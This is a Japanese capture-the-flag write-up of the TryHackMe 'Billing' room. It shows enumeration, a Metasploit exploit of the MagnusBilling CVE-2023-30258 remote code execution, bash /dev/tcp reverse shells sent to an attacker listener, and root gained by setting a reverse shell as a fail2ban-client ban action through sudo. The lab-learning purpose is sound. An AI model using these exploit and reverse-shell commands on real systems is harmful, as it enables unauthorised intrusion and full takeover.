---
{"dg-publish":true,"permalink":"/try-hack-me/machine/billing/","noteIcon":""}
---

![](https://i.imgur.com/4v8RPv5.png)

- URL : https://tryhackme.com/room/billing
- #easy 
- OS : #Linux 
- Machine Author(s): [tryhackme](https://tryhackme.com/p/tryhackme),[RunasRs](https://tryhackme.com/p/RunasRs)
- Hack Date: 2025-06-24

---

# Enumeration

## Nmap

| **ポート**  | **サービス** | **バージョン**                             | **その他**                                                    |
| -------- | -------- | ------------------------------------- | ---------------------------------------------------------- |
| 22/tcp   | ssh      | OpenSSH 9.2p1 Debian 2+deb12u6        | ssh-hostkey（ECDSA / ED25519）取得済み                           |
| 80/tcp   | http     | Apache httpd 2.4.62 (Debian)          | http-title: MagnusBillingrobots.txt: /mbilling/ を Disallow |
| 3306/tcp | mysql    | MariaDB 10.3.23 またはそれ以前（unauthorized） | 認証なしで接続不可                                                  |
| 5038/tcp | asterisk | Asterisk Call Manager 2.10.6          | 管理ポート（AMI）                                                 |


```bash
└─$ sudo nmap -p0-65535 -T4 -Pn -v --open $Target_IP -oG open_ports.txt
ports=$(grep "Ports:" open_ports.txt | awk -F'Ports: ' '{print $2}' | tr ',' '\n' | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
sudo nmap -sCV -A -Pn -p"$ports" -vv $Target_IP
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 20:49 PDT
Initiating Parallel DNS resolution of 1 host. at 20:49
Completed Parallel DNS resolution of 1 host. at 20:50, 5.52s elapsed
Initiating SYN Stealth Scan at 20:50
Scanning 10.10.138.80 [65536 ports]
Discovered open port 22/tcp on 10.10.138.80
Discovered open port 80/tcp on 10.10.138.80
Discovered open port 3306/tcp on 10.10.138.80
SYN Stealth Scan Timing: About 47.30% done; ETC: 20:51 (0:00:35 remaining)
Discovered open port 5038/tcp on 10.10.138.80
Completed SYN Stealth Scan at 20:53, 209.24s elapsed (65536 total ports)
Nmap scan report for 10.10.138.80
Host is up (0.26s latency).
Not shown: 64439 closed tcp ports (reset), 1093 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
5038/tcp open  unknown

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 214.87 seconds
           Raw packets sent: 79135 (3.482MB) | Rcvd: 73686 (2.947MB)
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 20:53 PDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:53
Completed NSE at 20:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:53
Completed NSE at 20:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:53
Completed NSE at 20:53, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 20:53
Completed Parallel DNS resolution of 1 host. at 20:53, 5.51s elapsed
Initiating SYN Stealth Scan at 20:53
Scanning 10.10.138.80 [4 ports]
Discovered open port 5038/tcp on 10.10.138.80
Discovered open port 3306/tcp on 10.10.138.80
Discovered open port 80/tcp on 10.10.138.80
Discovered open port 22/tcp on 10.10.138.80
Completed SYN Stealth Scan at 20:53, 0.29s elapsed (4 total ports)
Initiating Service scan at 20:53
Scanning 4 services on 10.10.138.80
Completed Service scan at 20:53, 6.71s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.10.138.80
Initiating Traceroute at 20:53
Completed Traceroute at 20:53, 0.37s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 20:53
Completed Parallel DNS resolution of 2 hosts. at 20:53, 5.52s elapsed
NSE: Script scanning 10.10.138.80.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:53
Completed NSE at 20:54, 7.73s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:54
Completed NSE at 20:54, 1.71s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:54
Completed NSE at 20:54, 0.01s elapsed
Nmap scan report for 10.10.138.80
Host is up, received user-set (0.28s latency).
Scanned at 2025-06-23 20:53:38 PDT for 24s

PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 34:8d:02:7f:dc:52:fc:1f:75:9a:54:11:d9:cb:3e:1a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLHXcEV57Rk6VOEPHFZIsfzwOW/E9DCEcBTM0d5KsnR3BXVAGfMQEMe+VQ+wCoh1izI6So7/leBTdN04wnqJ2bk=
|   256 41:b7:58:3b:9d:fa:3d:dc:ce:b3:e9:d2:64:c7:30:c5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK7jUg9tJDKVK6nGI5Q1/Ag3MCSMJeAFfEwUx5rtsy7y
80/tcp   open  http     syn-ack ttl 63 Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.62 (Debian)
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.138.80/mbilling/
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
3306/tcp open  mysql    syn-ack ttl 63 MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk syn-ack ttl 63 Asterisk Call Manager 2.10.6
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/23%OT=22%CT=%CU=41514%PV=Y%DS=2%DC=T%G=N%TM=685A215A
OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=
OS:A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M5
OS:08ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B
OS:3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=
OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%
OS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%
OS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=
OS:40%CD=S)

Uptime guess: 3.892 days (since Thu Jun 19 23:29:24 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5038/tcp)
HOP RTT       ADDRESS
1   373.36 ms 10.9.0.1
2   373.55 ms 10.10.138.80

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:54
Completed NSE at 20:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:54
Completed NSE at 20:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:54
Completed NSE at 20:54, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.54 seconds
           Raw packets sent: 36 (2.394KB) | Rcvd: 29 (1.946KB)

```


5038で動いてるAsterisk Call Manager 2.10.6が気になるね

Asterisk Call Managerは、Asterisk Manager Interface（AMI）の通称らしい
Asterisk Manager Interface（AMI）
- Asterisk本体に付属する管理APIインターフェース。主に外部からの制御・監視のための通信口。

80番で動いてるMagnusBillingも一般的(このボックス独自サービスではない)なもの
- しかし、バージョンわからず
- magnusbilling exploitで検索すると、以下がCVE:2023-30258が引っかかる
	- https://www.exploit-db.com/exploits/52170
	- Metasploitでもパッケージとして用意されているのがわかる
		- https://sploitus.com/exploit?id=1337DAY-ID-39148

Metasploitの方が便利なので、Metsaploit使う


## Feroxbuster
metasploitを起動している間に、feroxbusterも試す
- 特に有用な情報はなかったが、phpで作られているのがわかる
	- これが後々生きてくる
```bash
└─$ feroxbuster -u http://10.10.138.80                      
                                                                                                                                                                               
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.138.80
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        1l        0w        1c http://10.10.138.80/ => ./mbilling
301      GET        9l       28w      315c http://10.10.138.80/mbilling => http://10.10.138.80/mbilling/
301      GET        9l       28w      319c http://10.10.138.80/mbilling/tmp => http://10.10.138.80/mbilling/tmp/
301      GET        9l       28w      322c http://10.10.138.80/mbilling/assets => http://10.10.138.80/mbilling/assets/
301      GET        9l       28w      319c http://10.10.138.80/mbilling/lib => http://10.10.138.80/mbilling/lib/
301      GET        9l       28w      323c http://10.10.138.80/mbilling/archive => http://10.10.138.80/mbilling/archive/
200      GET        0l        0w        0c http://10.10.138.80/mbilling/fpdf/font/helveticabi.php
200      GET        0l        0w        0c http://10.10.138.80/mbilling/fpdf/font/courierbi.php
200      GET        0l        0w        0c http://10.10.138.80/mbilling/fpdf/font/timesbi.php
200      GET        0l        0w        0c http://10.10.138.80/mbilling/fpdf/font/helveticab.php
200      GET        0l        0w        0c http://10.10.138.80/mbilling/fpdf/font/courierb.php
200      GET        0l        0w        0c http://10.10.138.80/mbilling/fpdf/font/courier.php
200      GET        0l        0w        0c http://10.10.138.80/mbilling/fpdf/font/timesi.php
200      GET        0l        0w        0c http://10.10.138.80/mbilling/fpdf/font/timesb.php
301      GET        9l       28w      320c http://10.10.138.80/mbilling/fpdf => http://10.10.138.80/mbilling/fpdf/
200      GET      165l     1234w     7652c http://10.10.138.80/mbilling/LICENSE
[###################>] - 10m   119009/120031  49s     found:16      errors:11163  
[###################>] - 10m   119017/120031  49s     found:16      errors:11172  
[####################] - 10m   120031/120031  0s      found:16      errors:11500  
[####################] - 10m    30000/30000   50/s    http://10.10.138.80/ 
[####################] - 10m    30000/30000   49/s    http://10.10.138.80/mbilling/ 
[####################] - 1s     30000/30000   39683/s http://10.10.138.80/mbilling/tmp/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5s     30000/30000   5688/s  http://10.10.138.80/mbilling/assets/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 10m    30000/30000   49/s    http://10.10.138.80/mbilling/lib/ 
[####################] - 10m    30000/30000   52/s    http://10.10.138.80/mbilling/archive/ 
[####################] - 7s     30000/30000   4127/s  http://10.10.138.80/mbilling/fpdf/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4128/s  http://10.10.138.80/mbilling/fpdf/font/ => Directory listing (add --scan-dir-listings to scan)   
```

# Foothold
## Metasploit
 MagnusBillingに関するPoCを検索
PHPで動いていることは知っているので、PHPオプションを選択
```sh
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > search MagnusBilling

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258  2023-06-26       excellent  Yes    MagnusBilling application unauthenticated Remote Command Execution.
   1    \_ target: PHP                                            .                .          .      .
   2    \_ target: Unix Command                                   .                .          .      .
   3    \_ target: Linux Dropper                                  .                .          .      .


Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
After interacting with a module you can manually set a TARGET with set TARGET 'Linux Dropper'

msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > use 1
[*] Additionally setting TARGET => PHP
[*] Using configured payload php/meterpreter/reverse_tcp

```

設定して
```sh
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > show options

Module options (exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.155.237    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /mbilling        yes       The MagnusBilling endpoint URL
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


   When TARGET is 0:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   WEBSHELL                   no        The name of the webshell with extension. Webshell name will be randomly generated if left unset.


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.9.1.104       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHP


View the full module info with the info, or info -d command.

```

実行
RCEに成功した
```bash
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
[*] Started reverse TCP handler on 10.9.1.104:4444 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (40004 bytes) to 10.10.155.237
[+] Deleted GfKBrHywVNRf.php
[*] Meterpreter session 2 opened (10.9.1.104:4444 -> 10.10.155.237:40474) at 2025-06-23 22:10:36 -0700

meterpreter > ls
Listing: /var/www/html/mbilling/lib/icepay
==========================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100700/rwx------  768    fil   2024-02-27 11:44:28 -0800  icepay-cc.php
100700/rwx------  733    fil   2024-02-27 11:44:28 -0800  icepay-ddebit.php
100700/rwx------  736    fil   2024-02-27 11:44:28 -0800  icepay-directebank.php
100700/rwx------  730    fil   2024-02-27 11:44:28 -0800  icepay-giropay.php
100700/rwx------  671    fil   2024-02-27 11:44:28 -0800  icepay-ideal.php
100700/rwx------  720    fil   2024-02-27 11:44:28 -0800  icepay-mistercash.php
100700/rwx------  710    fil   2024-02-27 11:44:28 -0800  icepay-paypal.php
100700/rwx------  699    fil   2024-02-27 11:44:28 -0800  icepay-paysafecard.php
100700/rwx------  727    fil   2024-02-27 11:44:28 -0800  icepay-phone.php
100700/rwx------  723    fil   2024-02-27 11:44:28 -0800  icepay-sms.php
100700/rwx------  699    fil   2024-02-27 11:44:28 -0800  icepay-wire.php
100700/rwx------  25097  fil   2024-03-27 12:55:23 -0700  icepay.php
100644/rw-r--r--  0      fil   2024-09-13 02:17:00 -0700  null
```

しかし、meterpreterは不安定で、数分で落ちるので、ncでリバースシェル張る
```bash
meterpreter > shell
Process 2833 created.
Channel 0 created.
bash -c 'exec bash -i &>/dev/tcp/10.9.1.104/7777 <&1'
```

nc
```bash
└─$ nc -lvnp 7777
listening on [any] 7777 ...
connect to [10.9.1.104] from (UNKNOWN) [10.10.155.237] 57924
bash: cannot set terminal process group (1126): Inappropriate ioctl for device
bash: no job control in this shell
asterisk@ip-10-10-155-237:/var/www/html/mbilling/lib/icepay$ ls
ls
icepay-cc.php
icepay-ddebit.php
icepay-directebank.php
icepay-giropay.php
icepay-ideal.php
icepay-mistercash.php
icepay-paypal.php
icepay-paysafecard.php
icepay-phone.php
icepay-sms.php
icepay-wire.php
icepay.php
null
asterisk@ip-10-10-155-237:/var/www/html/mbilling/lib/icepay$ 

```

ユーザーフラグ取得
```bash
cat /home/magnus/user.txt

```


# Privilege Escalation

```bash
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
magnus:x:1000:1000:magnus,,,:/home/magnus:/bin/bash
asterisk:x:1001:1001:Asterisk PBX:/var/lib/asterisk:/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ntp:x:117:125::/nonexistent:/usr/sbin/nologin
mysql:x:118:126:MySQL Server,,,:/nonexistent:/bin/false
ssm-user:x:1002:1002::/home/ssm-user:/bin/sh
polkitd:x:998:998:polkit:/nonexistent:/usr/sbin/nologin
fwupd-refresh:x:119:129:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
ntpsec:x:120:130::/nonexistent:/usr/sbin/nologin
gnome-initial-setup:x:121:65534::/run/gnome-initial-setup/:/bin/false
debian:x:1003:1003:Debian:/home/debian:/bin/bash

id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
```

sudo -lの実行結果
- asterisk ユーザーは、パスワードなしで sudo /usr/bin/fail2ban-client を任意に実行できる！
```bash
sudo -l
Matching Defaults entries for asterisk on ip-10-10-155-237:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-10-155-237:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client

```

fail2banとは
- ブルートフォース攻撃を防ぐために設計されたセキュリティプログラム
- Fail2Banは **/var/log/auth.log**などのログファイルをスキャンし 、ログイン試行の失敗回数が多すぎるIPアドレスをブロックする

そもそもどんなコマンドがあるのかを調べる
```bash
sudo /usr/bin/fail2ban-client -h

Usage: fail2ban-client [OPTIONS] <COMMAND>

Fail2Ban v1.0.2 reads log file that contains password failure report
and bans the corresponding IP addresses using firewall rules.

<SNIP>
    set <JAIL> action <ACT> actionban <CMD>  sets the ban command <CMD> of the
                                             action <ACT> for <JAIL>
<SNIP>

Report bugs to https://github.com/fail2ban/fail2ban/issues
```

`set <JAIL> action <ACT> actionban <CMD>` 
- 任意のコマンドを設定可能
	- root権限で、リバースシェルを発火させることができる!?

まず、設定されているJAILを確認する
```bash
asterisk@ip-10-10-155-237:/home$ sudo /usr/bin/fail2ban-client set sshd action myact actionban "bin/bash"

2025-06-23 21:07:38,257 fail2ban                [3886]: ERROR   NOK: ('Invalid Action name: myact',)
'Invalid Action name: myact'
asterisk@ip-10-10-155-237:/home$ 

asterisk@ip-10-10-155-237:/home$ sudo /usr/bin/fail2ban-client status
sudo /usr/bin/fail2ban-client status
Status
|- Number of jail:	8
`- Jail list:	ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
```
`ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd`の8つのJAILを持っていることがわかった


次に、ACTを調べる
```sh
asterisk@ip-10-10-155-237:/home$ sudo /usr/bin/fail2ban-client get sshd actions
<ome$ sudo /usr/bin/fail2ban-client get sshd actions
The jail sshd has the following actions:
iptables-multiport
```

`iptables-multiport`というアクションが設定されているのがわかる

JAILとACTがわかったので、リバースシェルを設定して
```sh
asterisk@ip-10-10-155-237:/home$ sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "bash -c 'bash -i >& /dev/tcp/10.10.131.45/4444 0>&1'"
asterisk@ip-10-10-155-237:/home$
```

ban処理をトリガーして、実行できる
```sh
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.2
```

root権限でシェルが返ってきて、root.txtの取得
```bash
nc -lvnp 4444

root@ip-10-10-155-237:/# cd /root
cd /root
root@ip-10-10-155-237:/root# ls
ls
filename
passwordMysql.log
root.txt
root@ip-10-10-155-237:/root# cat root.txt

```


![](https://i.imgur.com/BIiQJ2S.png)

特に今回は詰まらず、撃破できたので詰まったポイントとかはありません


